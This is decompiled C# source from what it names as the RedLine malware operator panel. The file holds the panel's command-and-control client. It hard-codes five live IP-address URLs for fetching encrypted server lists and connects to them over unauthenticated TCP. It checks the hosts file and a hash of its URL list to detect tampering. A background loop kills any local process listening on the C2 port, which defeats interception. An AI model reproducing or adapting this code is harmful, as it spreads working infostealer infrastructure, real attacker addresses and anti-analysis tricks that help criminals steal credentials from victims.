using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using RedLine.MainPanel.Data.Core;
using RedLine.MainPanel.Data.Helpers;
using RedLine.MainPanel.Properties;

namespace RedLine.MainPanel.Models.Communication;

public static class GenericService
{
	private static object object_0;

	private static object object_1;

	private static object object_2;

	[CompilerGenerated]
	private static object object_3;

	[CompilerGenerated]
	private static readonly object object_4;

	[CompilerGenerated]
	private static object object_5;

	[CompilerGenerated]
	private static IntPtr intptr_0;

	private static object object_6;

	private static List<string> AddressList
	{
		[CompilerGenerated]
		get
		{
			return (List<string>)object_3;
		}
		[CompilerGenerated]
		set
		{
			object_3 = value;
		}
	}

	private static IClientChannel proxy
	{
		[CompilerGenerated]
		get
		{
			return (IClientChannel)object_5;
		}
		[CompilerGenerated]
		set
		{
			object_5 = value;
		}
	}

	private static bool RequireStopMonitor
	{
		[CompilerGenerated]
		get
		{
			return (byte)(nint)intptr_0 != 0;
		}
		[CompilerGenerated]
		set
		{
			intptr_0 = (IntPtr)(value ? 1 : 0);
		}
	}

	static GenericService()
	{
		object_0 = new object();
		object_2 = new Random();
		object_6 = new string[5] { "http://5.42.65.5/mainR", "http://45.142.214.169/mainR", "http://185.172.128.118/mainR", "http://45.147.228.47/mainR", "http://104.194.156.31/mainR" };
	}

	public static void Use(Action<IMainServer> codeBlock, bool firstRun = false)
	{
		lock (object_0)
		{
			try
			{
				StartMonitor();
				int num = 0;
				while (true)
				{
					if (AddressList == null || AddressList.Count == 0)
					{
						if (num <= 5)
						{
							AddressList = TryGetNodes();
							num++;
							continue;
						}
						throw new CommunicationException("Connection lost due security issue. №10");
					}
					num = 0;
					AddressList = AddressList.OrderBy((string x) => ((Random)object_2).Next()).Distinct().ToList();
					if (AddressList.Count < 5)
					{
						throw new CommunicationException("Unable to log in with this login and password. Try again");
					}
					bool flag = false;
					Exception ex = null;
					proxy = null;
					for (; num < 6; num++)
					{
						if (flag)
						{
							break;
						}
						for (int i = 0; i < AddressList.Count; i++)
						{
							if (flag)
							{
								break;
							}
							string text = AddressList[i];
							StartMonitor();
							object_1 = new NetTcpBinding
							{
								MaxReceivedMessageSize = 2147483647L,
								MaxBufferPoolSize = 2147483647L,
								CloseTimeout = TimeSpan.FromMinutes(1.0),
								OpenTimeout = (firstRun ? TimeSpan.FromSeconds(10.0) : TimeSpan.FromMinutes(5.0)),
								ReceiveTimeout = (firstRun ? TimeSpan.FromSeconds(60.0) : TimeSpan.FromMinutes(5.0)),
								SendTimeout = (firstRun ? TimeSpan.FromSeconds(20.0) : TimeSpan.FromMinutes(5.0)),
								TransferMode = TransferMode.Buffered,
								ReaderQuotas = new XmlDictionaryReaderQuotas
								{
									MaxDepth = 44567654,
									MaxArrayLength = int.MaxValue,
									MaxBytesPerRead = int.MaxValue,
									MaxNameTableCharCount = int.MaxValue,
									MaxStringContentLength = int.MaxValue
								},
								Security = new NetTcpSecurity
								{
									Mode = SecurityMode.None,
									Message = new MessageSecurityOverTcp
									{
										ClientCredentialType = MessageCredentialType.None
									}
								}
							};
							if (AuthenticodeTools.IsTrusted(typeof(Uri).Assembly.Location, extraCheck: false, "Microsoft Corporation"))
							{
								ChannelFactory<IMainServer> channelFactory = new ChannelFactory<IMainServer>((Binding)object_1, "net.tcp://" + text + "/");
								if (proxy == null)
								{
									proxy = (IClientChannel)channelFactory.CreateChannel();
								}
								else
								{
									if (proxy.State == CommunicationState.Faulted)
									{
										proxy.Abort();
									}
									else if (proxy.State != CommunicationState.Closed)
									{
										proxy.Close();
									}
									proxy = (IClientChannel)channelFactory.CreateChannel();
								}
								using (new OperationContextScope(proxy))
								{
									int num2 = proxy?.RemoteAddress.Uri.Port ?? 8778;
									if (PingHost("127.0.0.1", num2))
									{
										d((uint)num2);
									}
									if (!File.ReadAllText(Environment.ExpandEnvironmentVariables("%windir%\\system32\\drivers\\etc\\hosts")).Contains(text))
									{
										if (proxy.RemoteAddress.Uri.Port == 8778)
										{
											if (proxy.RemoteAddress.Uri.ToString() != "net.tcp://" + text + "/")
											{
												throw new CommunicationException("Connection lost due security issue. №7");
											}
											try
											{
												string md5Hash = Md5Helper.GetMd5Hash(string.Join(Environment.NewLine, (string[])object_6));
												string md5Hash2 = Md5Helper.GetMd5Hash(Encoding.UTF8.GetString(Resources.blob1));
												if (md5Hash != md5Hash2)
												{
													throw new CommunicationException("Unable to log in with this login and password. Try again");
												}
												if (!((IMainServer)proxy).IsAlive().Result)
												{
													continue;
												}
												if (!PingHost(text.Split(':')[0], 444))
												{
													throw new CommunicationException("Unable to log in with this login and password. Try again");
												}
												codeBlock((IMainServer)proxy);
												flag = true;
												proxy.Close();
												break;
											}
											catch (Exception ex2)
											{
												if (ex2.ToString().Contains("Login Failed"))
												{
													throw new CommunicationException("Unable to log in with this login and password. Try again");
												}
												ex = ex2;
											}
											continue;
										}
										throw new CommunicationException("Connection lost due security issue. №3");
									}
									throw new CommunicationException("Connection lost due security issue. №2");
								}
							}
							throw new CommunicationException("Connection lost due security issue. №1");
						}
					}
					if (!flag)
					{
						throw ex;
					}
					break;
				}
			}
			finally
			{
				StopMonitor();
			}
		}
	}

	public static List<string> TryGetNodes()
	{
		for (int i = 0; i < ((Array)object_6).Length; i++)
		{
			try
			{
				string cipher = string.Empty;
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create((string)((object[])object_6)[i]);
				obj.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.4.603 Yowser/2.5 Safari/537.36";
				obj.Timeout = 10000;
				obj.ReadWriteTimeout = 10000;
				using (Stream stream = ((HttpWebResponse)obj.GetResponse()).GetResponseStream())
				{
					using StreamReader streamReader = new StreamReader(stream);
					cipher = streamReader.ReadToEnd();
				}
				return (from x in StringTool.DecryptHosts(cipher).Split(new string[2]
					{
						"\n",
						Environment.NewLine
					}, StringSplitOptions.RemoveEmptyEntries)
					orderby ((Random)object_2).Next()
					select x).ToList();
			}
			catch (Exception)
			{
			}
		}
		return null;
	}

	public static void StartMonitor()
	{
		Task.Run(delegate
		{
			RequireStopMonitor = false;
			while (!RequireStopMonitor)
			{
				try
				{
					int num = proxy?.RemoteAddress.Uri.Port ?? 8778;
					if (PingHost("127.0.0.1", num))
					{
						d((uint)num);
					}
				}
				catch
				{
				}
			}
		});
	}

	public static void StopMonitor()
	{
		RequireStopMonitor = true;
	}

	public static bool PingHost(string hostUri, int portNumber)
	{
		try
		{
			using TcpClient tcpClient = new TcpClient();
			tcpClient.SendTimeout = 20000;
			tcpClient.Connect(hostUri, portNumber);
			return tcpClient.Connected;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static void d(uint port)
	{
		foreach (ProcessPort item in ProcessPorts.ProcessPortMap.FindAll((ProcessPort x) => x.PortNumber == port))
		{
			try
			{
				Process processById = Process.GetProcessById(item.ProcessId);
				processById.Kill();
				processById.WaitForExit();
			}
			catch
			{
			}
		}
	}
}
